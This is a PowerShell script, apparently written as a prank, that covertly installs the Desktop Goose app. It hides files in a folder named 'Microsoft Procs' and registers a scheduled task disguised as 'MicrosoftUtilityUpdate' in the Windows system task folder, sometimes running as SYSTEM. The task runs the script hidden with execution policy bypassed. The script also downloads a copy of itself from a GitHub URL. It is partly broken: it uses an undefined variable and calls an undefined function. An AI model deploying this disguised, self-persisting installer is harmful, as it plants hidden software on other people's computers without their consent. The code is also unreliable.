# installs desktop goose or desktop penguins

[CmdletBinding()]
param (
    [switch]$installdesktopgoose,
    [switch]$Remove
)

# Determine execution context (Admin vs User) and set paths
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "Context: Administrator" -ForegroundColor Cyan
    # create backup location to hide files
    $backupPath = "$env:ProgramFiles\Microsoft Procs"
    # options for scheduled task
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
    $taskpath = "\Microsoft\Windows\" # Place the task in a subfolder to hide it
} else {
    Write-Host "Context: Standard User ($env:USERNAME)" -ForegroundColor Cyan
    # create backup location to hide files
    $backupPath = "$env:USERPROFILE\AppData\Local\Microsoft Procs"
    # options for scheduled task
    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive
    $taskpath = "\" # Place the task in a subfolder to hide it
}





function Install-DesktopGoose {
    write-host "Installing Desktop Goose..." -ForegroundColor Green

    # Create backup directory if it doesn't exist
    if (-not (Test-Path $backupPath -ErrorAction SilentlyContinue)) {
        New-Item -Path $backupPath -ItemType Directory -Force | Out-Null
        Write-Host "Backup directory created at $backupPath" -ForegroundColor Green
    } else {
        Write-Host "Backup directory already exists at $backupPath" -ForegroundColor Yellow
    }

    #check that it was downloaded to the default location (part of install process)
    $download = Get-ChildItem -Path "$env:USERPROFILE\Downloads" -Filter "Desktop Goose*.zip" -ErrorAction SilentlyContinue | Select-Object -First 1
    if (Test-Path $download.FullName -ErrorAction SilentlyContinue) {
        Write-Host "Desktop Goose zip file found at $($download.FullName)" -ForegroundColor Green
        move-item -Path $download.FullName -Destination $backupPath -Force
        unpackgoose # function to extract the zip to the install path
    } else {
        Write-Host "Desktop Goose zip file not found. Please download it from the official website and place it in your Downloads folder." -ForegroundColor Red
        #manually download desktop goose zip
        write-host "First, we have to download the desktop goose zip file from the official website. Must be done manually. Please consider donating to the developer if you enjoy."
        Start-Process "https://samperson.itch.io/desktop-goose" ; pause
        if (Test-Path $download.FullName -ErrorAction SilentlyContinue) {
            Write-Host "Desktop Goose zip file found at $($download.FullName)" -ForegroundColor Green
            move-item -Path $download.FullName -Destination $backupPath -Force
            unpackgoose # function to extract the zip to the install path
        } else {
            Write-Host "Desktop Goose zip file not found in downloads. Exiting installation." -ForegroundColor Red
            pause ; exit
        }
    }
    #copy this script to the backup location so it can be called by the scheduled task even if the original is deleted
    write-host "Copying this script to the backup location for scheduled task use..." -ForegroundColor Green
    curl.exe -L -o $goooseScript "https://raw.githubusercontent.com/Mousman33/RandomPowerShell/main/FoulPlay/gooseprank.ps1"
    Unblock-File -Path $goooseScript
    Copy-Item -Path $goooseScript -Destination "$backupPath\gooseprank.ps1" -Force

    # Create a scheduled task to run this script at logon
    $taskname = "MicrosoftUtilityUpdate"
    if (get-scheduledtask -TaskName $taskname -ErrorAction SilentlyContinue) {
        Write-Host "Scheduled task '$taskname' already exists. Skipping task creation." -ForegroundColor Yellow
    } else {
        Write-Host "Creating scheduled task '$taskname' to run the gooseprank script at logon..." -ForegroundColor Green
        # Create the task
        $action = New-ScheduledTaskAction -Execute powershell.exe -Argument "-WindowStyle Hidden -NoProfile -executionpolicy bypass -File `"$backuppath\gooseprank.ps1`""
        $trigger = New-ScheduledTaskTrigger -Daily -At 12am -RandomDelay (New-TimeSpan -Minutes 60) # Add a random delay to make it less predictable
        $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
        Register-ScheduledTask -TaskName $taskname -Action $action -Trigger $trigger -Principal $principal -TaskPath $taskpath -Settings $settings -Force
        Write-Host "Scheduled task '$taskname' created to run at logon." -ForegroundColor Green
    }
    # execute the scheduled task immediately to start the prank without waiting for the next logon
    Start-ScheduledTask -TaskName $taskname
}


#region LOGIC

if ($installdesktopgoose) {
    Install-DesktopGoose
    exit
} else {
    $menu = @"
Please choose an action:
    1. Install Desktop Goose
"@
    Write-Host $menu
    $choice = Read-Host "Enter the number of your choice"
    switch ($choice) {
        "1" {
            Install-DesktopGoose
            exit
        }
        default {
            Write-Host "Invalid choice. Exiting." -ForegroundColor Red
            exit
        }
    }
}


